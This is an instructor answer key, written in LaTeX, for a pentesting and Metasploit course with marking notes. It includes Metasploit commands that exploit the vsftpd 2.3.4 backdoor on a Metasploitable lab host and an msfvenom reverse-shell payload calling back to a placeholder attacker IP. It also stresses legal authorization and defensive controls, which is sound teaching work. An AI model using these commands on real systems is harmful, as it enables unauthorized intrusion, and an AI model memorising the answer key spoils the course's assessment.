% ============================================================================
%  Solutions --- Intro to Pentesting, Red Teaming, Kali & Metasploit
%  Compile with:  pdflatex solutions.tex
%  INSTRUCTOR COPY --- do not distribute with the exercises.
% ============================================================================
\documentclass[11pt,a4paper]{article}

\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage[margin=2.4cm]{geometry}
\usepackage{lmodern}
\usepackage{enumitem}
\usepackage{listings}
\usepackage{xcolor}
\usepackage{titlesec}
\usepackage{fancyhdr}
\usepackage{tcolorbox}
\usepackage{hyperref}
\hypersetup{colorlinks=true, linkcolor=blue!50!black, urlcolor=blue!50!black}

\definecolor{codeBg}{HTML}{F4F6F8}
\definecolor{kaliBlue}{HTML}{367BF0}
\definecolor{okGreen}{HTML}{1E7E34}

\lstset{
  basicstyle=\ttfamily\small,
  backgroundcolor=\color{codeBg},
  breaklines=true,
  frame=single,
  rulecolor=\color{gray!40},
  showstringspaces=false,
}

\newtcolorbox{solbox}{colback=okGreen!6, colframe=okGreen, sharp corners,
  boxrule=0.6pt, left=6pt, right=6pt, top=4pt, bottom=4pt}

\titleformat{\section}{\large\bfseries\color{kaliBlue}}{\thesection.}{0.5em}{}

\pagestyle{fancy}\fancyhf{}
\lhead{Offensive Security --- Solutions (Instructor)}
\rhead{\thepage}
\setlength{\headheight}{14pt}

\newcounter{taskc}[section]
\newcommand{\sol}[1]{\refstepcounter{taskc}\medskip\noindent%
  \textbf{Solution \thesection.\thetaskc \quad}\textit{(#1)}\par\nobreak\smallskip}

\begin{document}

\begin{center}
  {\LARGE\bfseries Offensive Security --- Solutions}\\[0.4em]
  {\large Instructor copy --- model answers \& marking notes}\\[0.4em]
  Cyber Security Master Lecture \hfill \today
\end{center}
\vspace{0.5em}
\noindent\textit{Answers are model solutions; award partial credit for
equivalent reasoning. Exact version numbers/IPs depend on the lab build.}

% ---------------------------------------------------------------------------
\section{Concepts \& Ethics}

\sol{terminology}
\begin{solbox}
\textbf{Vulnerability scan:} automated, breadth-first detection of \emph{known}
weaknesses; no exploitation. Goal: inventory of potential issues. Deliverable:
a (often tool-generated) list of findings with severities. \\
\textbf{Penetration test:} time-boxed, goal to \emph{find and prove}
exploitable issues within a defined scope. Goal: demonstrate real impact.
Deliverable: a report with verified findings, evidence, and remediation. \\
\textbf{Red team:} objective-driven adversary emulation testing \emph{detection
and response}, with stealth. Goal: reach a specific objective and measure the
blue team. Deliverable: attack narrative mapped to ATT\&CK + detection gaps.
\\[2pt] \emph{Marking: 2 pts each (goal + deliverable).}
\end{solbox}

\sol{boxes}
\begin{solbox}
This is a \textbf{grey-box} test (partial knowledge: an account + diagram, no
source). \\
\emph{Advantage:} more efficient/thorough --- the tester spends time on real
issues rather than rediscovering the topology, giving better coverage in a
fixed budget. \\
\emph{Limitation:} less realistic for an external-attacker scenario; the
provided knowledge may bias the test and skip the ``how would an outsider even
get this far'' question.
\end{solbox}

\sol{legal}
\begin{solbox}
Required before any scanning: \textbf{(1)} a signed contract / Statement of Work
defining scope and deliverables; \textbf{(2)} explicit written
\textbf{authorization} from someone who \emph{owns} the target assets (not just
``a contact''); \textbf{(3)} agreed Rules of Engagement (allowed techniques,
testing window, emergency contacts). \\
\emph{Legal risk:} ``knowing the people'' is not consent. An unauthorized scan
already constitutes unlawful access/spying on data (\S202a/b StGB; CFAA in the
US) --- criminal liability, civil damages, and loss of professional standing,
regardless of intent.
\end{solbox}

\sol{killchain}
\begin{solbox}
(a) dumping hashes $\to$ \textbf{Post-Exploitation};
(b) cert-transparency lookup $\to$ \textbf{Recon} (passive);
(c) reusing hashes on another host $\to$ \textbf{Lateral Movement};
(d) writing CVSS scores $\to$ \textbf{Reporting}. \emph{1 pt each.}
\end{solbox}

% ---------------------------------------------------------------------------
\section{Reconnaissance \& Enumeration}

\sol{nmap-basics}
\begin{solbox}
On Metasploitable 2 a typical scan shows (versions approximate):
\begin{lstlisting}[language=bash]
21/tcp   ftp      vsftpd 2.3.4
22/tcp   ssh      OpenSSH 4.7p1
23/tcp   telnet   Linux telnetd
25/tcp   smtp     Postfix smtpd
80/tcp   http     Apache httpd 2.2.8
139/445  smb      Samba smbd 3.0.20
3306/tcp mysql    MySQL 5.0.51a
\end{lstlisting}
The \textbf{suspicious one is \texttt{vsftpd 2.3.4}}: that specific release was
distributed with a \emph{backdoor} (connecting with a username ending in
\texttt{:)} opens a root shell on port 6200). Also acceptable: noting Telnet
(cleartext) or the very old Samba/Apache versions. \emph{5 services = 5 pts.}
\end{solbox}

\sol{nmap-scripts}
\begin{solbox}
Examples (any two valid): \texttt{ftp-anon} --- reports anonymous FTP login is
allowed; \texttt{smb-os-discovery} --- reveals OS, hostname, workgroup;
\texttt{http-title} --- grabs the web app's page title hinting at running apps
(e.g.\ DVWA, phpMyAdmin); \texttt{ssh-hostkey} --- enumerates host keys.
\emph{2 pts each, must state what was revealed.}
\end{solbox}

\sol{passive}
\begin{solbox}
Three sources: \textbf{DNS / WHOIS} --- registered domains, name servers, mail
records, registrant info; \textbf{Certificate Transparency} (crt.sh) ---
subdomains from issued TLS certs without touching the target;
\textbf{Shodan/Censys} --- internet-wide scan data showing exposed services,
banners, and open ports already indexed. Also accept: Google dorking,
\texttt{theHarvester}, LinkedIn/OSINT for employees, breach databases.
\emph{2 pts per source with its yield.}
\end{solbox}

% ---------------------------------------------------------------------------
\section{Exploitation with Metasploit}

\sol{msf-workflow}
\begin{solbox}
\begin{lstlisting}[language=bash]
msf6 > search vsftpd
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(...) > set RHOSTS <TARGET>
msf6 exploit(...) > run
[+] ... Command shell session 1 opened ...
> whoami
root
> id
uid=0(root) gid=0(root)
\end{lstlisting}
The backdoor yields a \textbf{root} shell directly (no privilege escalation
needed), because the malicious code runs as the FTP daemon's user, which is
root here. \emph{Commands 4 pts, proof of shell + correct privilege 4 pts.}
\end{solbox}

\sol{module-types}
\begin{solbox}
\texttt{vsftpd\_234\_backdoor} is an \textbf{exploit} module. \\
Other types --- \textbf{auxiliary:} e.g.\
\texttt{auxiliary/scanner/portscan/tcp} or an SMB version scanner (recon/fuzzing,
no payload). \textbf{post:} e.g.\
\texttt{post/multi/recon/local\_exploit\_suggester} or
\texttt{post/linux/gather/hashdump} (run \emph{after} a session exists to gather
data / escalate). Bonus mention: \texttt{payloads}, \texttt{encoders},
\texttt{nops}. \emph{2 pts identification + 2 pts per other type.}
\end{solbox}

\sol{payload-choice}
\begin{solbox}
\textbf{Bind} payload: opens a listening port \emph{on the target}; the attacker
connects \emph{in}. \textbf{Reverse} payload: the target connects \emph{out}
back to the attacker's listener. \\
Behind a firewall blocking inbound but allowing outbound, choose
\textbf{reverse}: the connection originates from inside the network, so it
traverses the firewall (and often NAT) where an inbound bind connection would be
dropped.
\end{solbox}

\sol{msfvenom}
\begin{solbox}
\begin{lstlisting}[language=bash]
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=<KALI_IP> LPORT=4444 -f elf -o shell.elf
\end{lstlisting}
Matching listener:
\begin{lstlisting}[language=bash]
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD linux/x64/shell_reverse_tcp
msf6 > set LHOST <KALI_IP>
msf6 > set LPORT 4444
msf6 > run        # waits for the payload to call back
\end{lstlisting}
\emph{Key point: the handler's PAYLOAD/LHOST/LPORT must exactly match the
generated payload. 3 pts msfvenom, 3 pts handler.}
\end{solbox}

% ---------------------------------------------------------------------------
\section{Post-Exploitation \& Red Team Thinking}

\sol{postex}
\begin{solbox}
A reasonable order: \textbf{(1) Situational awareness} ---
\texttt{whoami}/\texttt{id}, \texttt{uname -a}, network config, who else is
logged in (understand where you are). \textbf{(2) Privilege escalation} ---
hunt for kernel/config/SUID issues to reach root/SYSTEM. \textbf{(3) Credential
harvesting} --- dump hashes, config files, keys for reuse. \textbf{(4)
Persistence \& lateral movement} --- establish a way back and map adjacent
hosts. Accept other sensible orderings if goals are correct. \emph{1.5 pts
each.}
\end{solbox}

\sol{pivot}
\begin{solbox}
\textbf{Pivoting / lateral movement} = using a compromised host as a stepping
stone to reach systems that are not directly accessible from the attacker (often
on an internal segment). It loops back to enumeration because each new foothold
exposes a \emph{new} internal network that must be scanned and enumerated from
scratch. Enabling feature: Meterpreter's \texttt{portfwd} or
\texttt{autoroute} + SOCKS proxy (\texttt{auxiliary/server/socks\_proxy}).
\end{solbox}

\sol{redvsblue}
\begin{solbox}
\textbf{Success argument:} the team validated a real attack path to domain
admin --- the organisation now knows the exposure exists.
\textbf{Failure-for-the-attacker / success-for-defender argument:} they were
\emph{detected}, which for a red team is arguably the desired outcome --- it
proves the SOC works. \\
The \textbf{primary deliverable of a red team} is not the list of vulnerabilities
(that's a pentest) but an assessment of \emph{detection and response}: what the
blue team saw, missed, and how fast they reacted. ``Getting caught'' is data,
not failure. \emph{Full marks require naming detection/response as the goal.}
\end{solbox}

\sol{defence}
\begin{solbox}
Examples (any three technique$\to$control pairs):
\begin{itemize}[leftmargin=1.4em, itemsep=1pt]
  \item \emph{vsftpd backdoor} $\to$ patch/configuration management; remove
        unmaintained services; software integrity verification.
  \item \emph{Hash dumping} $\to$ least privilege so a service isn't root;
        strong/slow hashing + long passwords; credential guard / LSASS
        protection; detect with EDR.
  \item \emph{Reverse shell egress} $\to$ egress filtering / proxy; network
        segmentation; IDS/IPS and EDR alerting on anomalous outbound
        connections.
  \item \emph{Lateral movement} $\to$ network segmentation, MFA, disabling
        legacy auth, monitoring for pass-the-hash.
\end{itemize}
\emph{2 pts per valid pair.}
\end{solbox}

% ---------------------------------------------------------------------------
\section*{Challenge --- marking guide}
\sol{capstone}
\begin{solbox}
Award bonus for a finding that contains \emph{all} report elements: clear title
(e.g.\ ``Unauthenticated Remote Root via vsftpd 2.3.4 Backdoor''); a defensible
\textbf{CVSS} vector (this one is effectively Critical, ~9.8:
\texttt{AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H}); affected asset (target IP/service);
description of root cause; numbered reproduction steps; evidence (command output
/ screenshot of \texttt{whoami=root}); and concrete remediation (upgrade/replace
vsftpd, restrict the service, network controls). Deduct for missing
reproduction steps or hand-wavy remediation.
\end{solbox}

\end{document}
